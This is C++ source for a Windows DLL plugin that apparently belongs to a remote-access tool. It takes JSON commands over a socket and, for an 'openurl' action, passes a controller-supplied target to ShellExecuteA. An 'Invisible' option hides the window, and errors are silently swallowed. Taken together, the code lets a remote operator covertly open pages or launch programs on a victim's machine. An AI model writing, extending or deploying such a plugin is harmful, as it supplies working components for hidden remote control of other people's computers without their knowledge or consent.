#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shellapi.h>
#include <string>
#include "../../include/json.hpp"

#pragma comment(lib, "shell32.lib")

using json = nlohmann::json;
using namespace std;

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    // Basic plugin run - no default action
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        if (action == "openurl") {
            string url  = command.value("url", "");
            string mode = command.value("mode", "Visible");
            int showCmd = SW_SHOWNORMAL;
            if (mode == "Invisible") showCmd = SW_HIDE;

            ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, showCmd);
        }
    } catch (...) {
        // Silently handle errors
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
